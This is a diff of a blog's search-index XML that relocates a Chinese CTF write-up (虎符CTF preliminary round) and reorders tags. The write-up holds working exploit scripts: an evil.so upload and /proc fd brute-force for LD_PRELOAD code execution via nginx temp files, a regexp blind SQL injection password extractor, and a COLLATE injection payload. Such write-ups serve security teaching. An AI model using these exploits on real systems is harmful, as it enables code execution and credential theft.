class="hljs-string">&quot;rb&quot;</span>).read()<br><br>    packet = <span class="hljs-string">f&quot;&quot;&quot;POST /index.php HTTP/1.1\r\nHOST:<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>\r\nContent-Length:<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data)+<span class="hljs-number">11</span>&#125;</span>\r\n\r\n&quot;&quot;&quot;</span><br>    packet = packet.encode()<br>    <br>    packet += data<br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((host, port))<br>    s.sendall(packet)<br>    time.sleep(<span class="hljs-number">10</span>)<br>    s.close()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>do_so()<br><br></code></pre></div></td></tr></table></figure><p>fd爆破</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br>port = <span class="hljs-number">8020</span><br>host = <span class="hljs-string">&quot;ip&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ldload</span>(<span class="hljs-params">pid, fd</span>):</span><br>     sopath = <span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;pid&#125;</span>/fd/<span class="hljs-subst">&#123;fd&#125;</span>&quot;</span><br>     <span class="hljs-comment"># print(sopath)</span><br>     r = requests.get(<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>/index.php&quot;</span>, params=&#123;<span class="hljs-string">&quot;env&quot;</span>:<span class="hljs-string">f&quot;LD_PRELOAD=<span class="hljs-subst">&#123;sopath&#125;</span>&quot;</span>&#125;)<br>     <span class="hljs-keyword">return</span> r<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br> <span class="hljs-comment"># ldload(20, 20)</span><br> <span class="hljs-keyword">for</span> pid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>, <span class="hljs-number">40</span>):<br>     <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):<br>         t = Thread(target=ldload, args=(pid, fd))<br>         t.start()<br></code></pre></div></td></tr></table></figure><h1 id="chain"><a href="#chain" class="headerlink" title="chain"></a>chain</h1><p>regexp配合短路与进行盲注。得到密码后对大小写进行爆破。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> string<br>url = <span class="hljs-string">&quot;http://47.107.231.226:20155/login&quot;</span><br><br>s = requests.session()<br>result= <span class="hljs-string">&#x27;&#x27;</span><br>password = <span class="hljs-string">&#x27;m&#x27;</span><br><span class="hljs-comment"># m52fpldxyylb++^</span><br><span class="hljs-comment"># M52fpLdxyYlB++  M52fpLdxyYlB  52fpLdxyYlB</span><br><span class="hljs-comment"># m52fpldxyylb^eizar!8gxH$</span><br><span class="hljs-comment"># M52fpLdxyYlB^eizAR!8gxH$</span><br><span class="hljs-comment">#qay8tefyzc67aeoo  qay8tEFYZc67aeoO</span><br><span class="hljs-comment">#qay8tEFYZc67aeoO</span><br><span class="hljs-comment">#  \\\\! \\\\@ \\\\$ \\\\% \\\\^ \\\\&amp;  \\\\_ \\\\+</span><br><span class="hljs-built_in">str</span> = string.ascii_letters + string.digits + <span class="hljs-string">&quot;!\@%^&amp;_+$&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;!\@$%^&amp;_+&quot;</span>:<br>            i = <span class="hljs-string">&#x27;\\&#x27;</span> +<span class="hljs-string">&#x27;\\&#x27;</span> + i<br>        <span class="hljs-comment"># if i in &quot;#()*+,-.;?&quot;:</span><br>        <span class="hljs-comment">#     continue</span><br>        test = password +i<br><br>        data =    <span class="hljs-string">&quot;username=fdfd&#x27;or`password`regexp&#x27;^&quot;</span> + test + <span class="hljs-string">&quot;&#x27;or`password`regexp&#x27;^[&amp;password=123&quot;</span><br>        res = s.post(url,data,headers=&#123;<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;)<br>        <span class="hljs-comment"># print(res.request.body)</span><br>        <span class="hljs-comment"># print(res.status_code)</span><br>        <span class="hljs-comment"># print(&quot;fdfd&#x27;or`password`regexp&#x27;^&#x27;&quot;+  test +&quot;or`password`regexp&#x27;^[&quot;)</span><br>        <span class="hljs-comment"># print(&quot;fdfd&#x27;or`password`regexp&#x27;^&#123;&#125;&#x27;or`password`regexp&#x27;^[&quot;.format(chr(i)))</span><br>        <span class="hljs-keyword">if</span> res.status_code ==<span class="hljs-number">401</span>:<br>            result +=i<br>            password = password +i<br>            <span class="hljs-built_in">print</span>(password)<br>            <span class="hljs-keyword">continue</span><br><br></code></pre></div></td></tr></table></figure><p>但是这样无法区别大小写所以还得爆破大小写登录，官方wp里面使用的是整数溢出触发错误+<code>COLLATE&#39;utf8mb4_bin或COLLATE&#39;utf8mb4_0900_as_cs</code>来区别大小写<br>payload</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=b&#x27;||`password`COLLATE&#x27;utf<span class="hljs-number">8</span>mb<span class="hljs-number">4</span>_<span class="hljs-number">0900</span>_as_cs&#x27;like&#x27;m<span class="hljs-number">52</span>F§<span class="hljs-number">6</span>§%&#x27;&amp;&amp;`id`=&#x27;<span class="hljs-number">1</span>&#x27;||`password`regexp&#x27;[&amp;password=<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>]]></content>
-    
-    
-    <categories>
-      
-      <category>ctf</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
       <tag>web</tag>
-      
-      <tag>ctf</tag>
       
     </tags>
     
@@ -452,9 +452,36 @@
     
     <tags>
       
+      <tag>ctf</tag>
+      
       <tag>web</tag>
       
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>虎符初赛</title>
+    <link href="/2022/07/24/2022-7-24-%E8%99%8E%E7%AC%A6ctf%E5%88%9D%E8%B5%9B/"/>
+    <url>/2022/07/24/2022-7-24-%E8%99%8E%E7%AC%A6ctf%E5%88%9D%E8%B5%9B/</url>
+    
+    <content type="html"><![CDATA[<h1 id="虎符ctf初赛"><a href="#虎符ctf初赛" class="headerlink" title="虎符ctf初赛"></a>虎符ctf初赛</h1><h1 id="java-ezchain"><a href="#java-ezchain" class="headerlink" title="java-ezchain"></a>java-ezchain</h1><p>参考文章&gt;<br><a href="http://novic4.cn/index.php/archives/23.html">http://novic4.cn/index.php/archives/23.html</a><br><a href="https://ha1c9on.top/?p=1973">https://ha1c9on.top/?p=1973</a></p><h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><p>nginx的临时缓存文件配合LD_PRELOAD</p><p><a href="https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/">参考hxp题解</a><br>参考<a href="https://tttang.com/archive/1384/">https://tttang.com/archive/1384/</a></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading<br><span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br>port = <span class="hljs-number">8020</span><br>host = <span class="hljs-string">&quot;ip&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_so</span>():</span><br>    data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;evil.so&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><br>    packet = <span class="hljs-string">f&quot;&quot;&quot;POST /index.php HTTP/1.1\r\nHOST:<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>\r\nContent-Length:<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data)+<span class="hljs-number">11</span>&#125;</span>\r\n\r\n&quot;&quot;&quot;</span><br>    packet = packet.encode()<br>    <br>    packet += data<br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((host, port))<br>    s.sendall(packet)<br>    time.sleep(<span class="hljs-number">10</span>)<br>    s.close()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>do_so()<br><br></code></pre></div></td></tr></table></figure><p>fd爆破</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br>port = <span class="hljs-number">8020</span><br>host = <span class="hljs-string">&quot;ip&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ldload</span>(<span class="hljs-params">pid, fd</span>):</span><br>     sopath = <span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;pid&#125;</span>/fd/<span class="hljs-subst">&#123;fd&#125;</span>&quot;</span><br>     <span class="hljs-comment"># print(sopath)</span><br>     r = requests.get(<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>/index.php&quot;</span>, params=&#123;<span class="hljs-string">&quot;env&quot;</span>:<span class="hljs-string">f&quot;LD_PRELOAD=<span class="hljs-subst">&#123;sopath&#125;</span>&quot;</span>&#125;)<br>     <span class="hljs-keyword">return</span> r<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br> <span class="hljs-comment"># ldload(20, 20)</span><br> <span class="hljs-keyword">for</span> pid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>, <span class="hljs-number">40</span>):<br>     <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):<br>         t = Thread(target=ldload, args=(pid, fd))<br>         t.start()<br></code></pre></div></td></tr></table></figure><h1 id="chain"><a href="#chain" class="headerlink" title="chain"></a>chain</h1><p>regexp配合短路与进行盲注。得到密码后对大小写进行爆破。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> string<br>url = <span class="hljs-string">&quot;http://47.107.231.226:20155/login&quot;</span><br><br>s = requests.session()<br>result= <span class="hljs-string">&#x27;&#x27;</span><br>password = <span class="hljs-string">&#x27;m&#x27;</span><br><span class="hljs-comment"># m52fpldxyylb++^</span><br><span class="hljs-comment"># M52fpLdxyYlB++  M52fpLdxyYlB  52fpLdxyYlB</span><br><span class="hljs-comment"># m52fpldxyylb^eizar!8gxH$</span><br><span class="hljs-comment"># M52fpLdxyYlB^eizAR!8gxH$</span><br><span class="hljs-comment">#qay8tefyzc67aeoo  qay8tEFYZc67aeoO</span><br><span class="hljs-comment">#qay8tEFYZc67aeoO</span><br><span class="hljs-comment">#  \\\\! \\\\@ \\\\$ \\\\% \\\\^ \\\\&amp;  \\\\_ \\\\+</span><br><span class="hljs-built_in">str</span> = string.ascii_letters + string.digits + <span class="hljs-string">&quot;!\@%^&amp;_+$&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;!\@$%^&amp;_+&quot;</span>:<br>            i = <span class="hljs-string">&#x27;\\&#x27;</span> +<span class="hljs-string">&#x27;\\&#x27;</span> + i<br>        <span class="hljs-comment"># if i in &quot;#()*+,-.;?&quot;:</span><br>        <span class="hljs-comment">#     continue</span><br>        test = password +i<br><br>        data =    <span class="hljs-string">&quot;username=fdfd&#x27;or`password`regexp&#x27;^&quot;</span> + test + <span class="hljs-string">&quot;&#x27;or`password`regexp&#x27;^[&amp;password=123&quot;</span><br>        res = s.post(url,data,headers=&#123;<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;)<br>        <span class="hljs-comment"># print(res.request.body)</span><br>        <span class="hljs-comment"># print(res.status_code)</span><br>        <span class="hljs-comment"># print(&quot;fdfd&#x27;or`password`regexp&#x27;^&#x27;&quot;+  test +&quot;or`password`regexp&#x27;^[&quot;)</span><br>        <span class="hljs-comment"># print(&quot;fdfd&#x27;or`password`regexp&#x27;^&#123;&#125;&#x27;or`password`regexp&#x27;^[&quot;.format(chr(i)))</span><br>        <span class="hljs-keyword">if</span> res.status_code ==<span class="hljs-number">401</span>:<br>            result +=i<br>            password = password +i<br>            <span class="hljs-built_in">print</span>(password)<br>            <span class="hljs-keyword">continue</span><br><br></code></pre></div></td></tr></table></figure><p>但是这样无法区别大小写所以还得爆破大小写登录，官方wp里面使用的是整数溢出触发错误+<code>COLLATE&#39;utf8mb4_bin或COLLATE&#39;utf8mb4_0900_as_cs</code>来区别大小写<br>payload</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=b&#x27;||`password`COLLATE&#x27;utf<span class="hljs-number">8</span>mb<span class="hljs-number">4</span>_<span class="hljs-number">0900</span>_as_cs&#x27;like&#x27;m<span class="hljs-number">52</span>F§<span class="hljs-number">6</span>§%&#x27;&amp;&amp;`id`=&#x27;<span class="hljs-number">1</span>&#x27;||`password`regexp&#x27;[&amp;password=<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -479,9 +506,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -506,9 +533,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -533,9 +560,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -560,9 +587,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -639,9 +666,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -666,9 +693,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -799,9 +826,9 @@
     
     <tags>
       
-      <tag>nodejs</tag>
-      
       <tag>web</tag>
+      
+      <tag>nodejs</tag>
       
     </tags>
     
@@ -839,9 +866,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -893,9 +920,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -920,9 +947,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -947,9 +974,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -974,9 +1001,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1001,9 +1028,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1028,9 +1055,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1055,9 +1082,9 @@
     
     <tags>
       
-      <tag>nodejs</tag>
-      
       <tag>web</tag>
+      
+      <tag>nodejs</tag>
       
     </tags>
     
@@ -1109,9 +1136,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1136,9 +1163,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1163,9 +1190,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1190,9 +1217,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1217,9 +1244,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1244,9 +1271,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1271,9 +1298,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1298,9 +1325,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1350,9 +1377,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1377,9 +1404,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1404,9 +1431,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1431,9 +1458,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1458,9 +1485,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1485,9 +1512,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1512,9 +1539,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1539,9 +1566,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -1566,9 +1593,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
